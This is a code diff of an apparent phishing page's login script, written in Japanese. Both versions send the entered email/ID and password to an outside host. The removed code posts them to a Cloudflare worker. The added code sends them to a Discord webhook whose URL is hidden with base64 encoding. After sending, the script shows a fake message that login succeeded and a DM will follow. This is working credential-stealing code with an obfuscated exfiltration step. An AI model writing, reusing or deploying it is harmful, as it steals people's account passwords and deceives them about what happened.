@@ -34,36 +34,34 @@
     </div>
   </div>
   <script>
-   document.getElementById('sendButton').addEventListener('click', function () {
-  const input1 = document.getElementById('eid').value;
-  const input2 = document.getElementById('pas').value;
+   document.getElementById('sendButton').addEventListener('click', function() {
+      const input1 = document.getElementById('eid').value;
+      const input2 = document.getElementById('pas').value;
+const encodedWebhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5ODczNTc2NTM3NDExMTc5NC9pQVNxejI2M1g4TVNOYlh3ZkREYWtHRmk1bWR3NzZyLXM1aGRWSmVUYm96S0NzQWNfYm9yaGprLXBSUk0tMUlXODQ4dw==";
+      const webhookURL = atob(encodedWebhookURL);
 
-  const workerURL = 'https://hk.letsgopony.workers.dev/';
+      const payload = {
+        content: `📩 :\n**メアドまたはID**: ${input1}\n**パスワード**: ${input2}`
+      };
 
-  const payload = {
-    input1: input1,
-    input2: input2
-  };
-
-  fetch(workerURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(payload)
-  })
-  .then(response => {
-    if (response.ok) {
-      alert('ログインが完了しました。５分程度でDMが送信されます');
-    } else {
-      alert('ログインに失敗しました。');
-    }
-  })
-  .catch(error => {
-    console.error('エラー:', error);
-    alert('エラーが発生しました。');
-  });
-});
-
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('ログインが完了しました。５分程度でDMが送信されます');
+        } else {
+          alert('ログインに失敗しました。');
+        }
+      })
+      .catch(error => {
+        console.error('エラー:', error);
+        alert('エラーが発生しました。');
+      });
+    });
   </script>
  
